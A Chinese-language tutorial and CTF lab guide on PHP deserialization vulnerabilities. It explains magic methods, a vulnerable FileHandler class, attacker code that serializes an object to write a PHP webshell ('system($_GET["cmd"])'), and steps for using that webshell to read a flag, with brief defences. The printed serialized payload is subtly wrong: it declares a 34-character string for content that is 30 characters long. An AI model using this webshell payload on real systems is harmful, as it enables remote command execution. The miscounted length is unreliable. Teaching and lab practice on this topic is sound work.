# PHP 反序列化漏洞

## 概述

PHP 反序列化漏洞发生在 `unserialize()` 函数处理用户输入时。攻击者可以构造恶意的序列化数据，利用魔术方法执行任意代码。

## 关键函数

```php
serialize($obj)     // 序列化：对象 → 字符串
unserialize($str)   // 反序列化：字符串 → 对象
```

## 魔术方法

```php
__construct()    // 构造函数，创建对象时调用
__destruct()     // 析构函数，对象销毁时调用
__wakeup()       // unserialize() 时调用
__toString()     // 对象转字符串时调用
__call()         // 调用不存在的方法时调用
__get()          // 访问不存在的属性时调用
```

## 漏洞原理

```php
class FileHandler {
    public $filename;
    public $content;

    public function __wakeup() {
        file_put_contents($this->filename, $this->content);
    }
}
```

攻击者构造：

```php
$obj = new FileHandler();
$obj->filename = 'shell.php';
$obj->content = '<?php system($_GET["cmd"]); ?>';
echo serialize($obj);
```

输出：

```
O:11:"FileHandler":2:{s:8:"filename";s:9:"shell.php";s:7:"content";s:34:"<?php system($_GET["cmd"]); ?>";}
```

## 攻击步骤

1. 分析可用的类和魔术方法
2. 构造恶意对象
3. 序列化对象
4. 将序列化数据传入 `unserialize()`
5. 魔术方法被触发，执行恶意代码

## 常见利用链

### 文件写入

```php
__wakeup() → file_put_contents()
```

### 命令执行

```php
__destruct() → system() / exec()
```

### SQL 注入

```php
__toString() → 拼接 SQL 语句
```

## 防御

1. 不要对用户输入使用 `unserialize()`
2. 使用 `json_decode()` 替代
3. 使用 `allowed_classes` 参数限制可反序列化的类

## 练习步骤

1. 查看页面源码，分析可用的类
2. 构造 FileHandler 对象的序列化数据
3. 提交序列化数据
4. `__wakeup()` 被触发，创建 webshell
5. 访问 webshell 获取 flag

## flag

在 `/flag` 文件中查找 `CR{...}` 格式的 flag。
